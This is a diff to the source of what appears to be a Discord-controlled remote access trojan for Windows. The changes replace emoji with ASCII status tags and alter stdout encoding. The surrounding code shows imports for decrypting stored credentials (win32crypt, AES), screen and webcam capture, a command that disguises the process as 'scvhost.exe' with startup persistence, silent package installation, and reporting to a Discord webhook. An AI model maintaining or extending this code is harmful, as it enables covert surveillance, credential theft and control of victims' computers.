@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import discord
 import subprocess
 import os
@@ -23,6 +24,11 @@ from Crypto.Cipher import AES
 import win32crypt
 from PIL import ImageGrab
 import cv2
+
+# Force UTF-8 encoding for stdout/stderr
+if sys.platform == 'win32':
+    sys.stdout = open(sys.stdout.fileno(), 'w', encoding='utf-8', buffering=1)
+    sys.stderr = open(sys.stderr.fileno(), 'w', encoding='utf-8', buffering=1)
 
 load_dotenv()
 
@@ -410,7 +416,7 @@ def install_package(package_name):
             timeout=60
         )
         if result.returncode == 0:
-            return f"✅ Installed {package_name} using pip"
+            return f"[OK] Installed {package_name} using pip"
         
         result = subprocess.run(
             f'winget install {package_name} --silent',
@@ -420,11 +426,11 @@ def install_package(package_name):
             timeout=60
         )
         if result.returncode == 0:
-            return f"✅ Installed {package_name} using winget"
+            return f"[OK] Installed {package_name} using winget"
         
-        return f"❌ Failed to install {package_name}"
+        return f"[FAILED] Failed to install {package_name}"
     except Exception as e:
-        return f"❌ Installation error: {str(e)}"
+        return f"[ERROR] Installation error: {str(e)}"
 
 @bot.event
 async def on_ready():
@@ -508,16 +514,16 @@ async def unhide(ctx):
 @bot.command()
 async def status(ctx):
     if is_hidden:
-        await ctx.send("🔒 Bot is currently HIDDEN as scvhost.exe")
+        await ctx.send("[LOCKED] Bot is currently HIDDEN as scvhost.exe")
         await send_webhook("Status: Hidden as scvhost.exe")
     else:
-        await ctx.send("🔓 Bot is NOT hidden")
+        await ctx.send("[UNLOCKED] Bot is NOT hidden")
         await send_webhook("Status: Not hidden")
 
 @bot.command()
 async def eject(ctx):
     """Unlaunch the program - shuts down without removing startup if hidden"""
-    await ctx.send("🔄 Ejecting bot...")
+    await ctx.send("[EJECT] Ejecting bot...")
     await send_webhook("**BOT EJECTED** - Shutting down")
     
     try:
@@ -540,15 +546,15 @@ exit
             with open(batch_path, 'w') as f:
                 f.write(batch_content)
             subprocess.Popen([batch_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            await ctx.send("👋 Bot ejected and files deleted!")
+            await ctx.send("[OK] Bot ejected and files deleted!")
         else:
             # Bot is hidden - just close without deleting
-            await ctx.send("👋 Bot ejected (hidden mode - startup preserved)")
+            await ctx.send("[OK] Bot ejected (hidden mode - startup preserved)")
 
         await bot.close()
         
     except Exception as e:
-        await ctx.send(f"Eject failed: {str(e)}")
+        await ctx.send(f"[ERROR] Eject failed: {str(e)}")
         await send_webhook(f"Eject failed: {str(e)}")
 
 @bot.command()
@@ -789,9 +795,11 @@ async def webhook_test(ctx):
     await ctx.send("Test sent.")
 
 if __name__ == '__main__':
+    # Suppress output with UTF-8 encoding
     import sys
     import io
-    sys.stdout = io.StringIO()
-    sys.stderr = io.StringIO()
+    if sys.platform == 'win32':
+        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
+        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
     
     bot.run(TOKEN)
